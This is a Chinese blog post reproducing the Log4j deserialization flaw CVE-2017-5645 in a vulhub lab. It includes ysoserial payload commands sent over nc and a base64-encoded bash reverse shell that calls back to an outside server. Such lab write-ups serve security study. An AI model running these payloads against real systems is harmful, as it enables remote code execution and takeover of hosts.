# Apache Log4j Server 反序列化命令执行漏洞（CVE-2017-5645）

**Apache [Log4j](https://so.csdn.net/so/search?q=Log4j&spm=1001.2101.3001.7020)是一个用于Java的日志记录库，其支持启动远程日志服务器，能够控制日志的输出格式与目的地。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码**



# 影响版本

- Log4j<2.8.2



# 漏洞复现

使用vulhub的靶场，开启后该环境默认端口为4712

需要下载一个jar包

![image-20220604124643005](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220604124643005.png)

使用刚才下载的ysoserial生成payload，发送给目标服务器的4712端口，使其加载执行代码

```
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 "touch /tmp/CVE‐2017‐5645" | nc 192.168.159.129 4712
```

![image-20220604124937959](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220604124937959.png)

可以看到该payload成功执行

![image-20220604125032427](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220604125032427.png)



# 反弹shell

如上操作，将payload改成base64加密后进行发送

```
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIxLjE4NC4yMjQvNTIwMCAwPiYx}|{base64,-d}|{bash,-i}" | nc 192.168.159.129 4712
```



![在这里插入图片描述](https://img-blog.csdnimg.cn/57bcf63068cb46fe8be4c6018e3ebda5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWXN0ZXJDY2M=,size_20,color_FFFFFF,t_70,g_se,x_16)

准备一台公网服务器，开启nc监听（用于探测漏洞）

使用nc监听刚刚反弹shell的端口

![img](https://img-blog.csdnimg.cn/20210118181111506.png)

![image-20220610223814985](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220610223814985.png)

成功获得shell



# 修复建议

升级到最新版本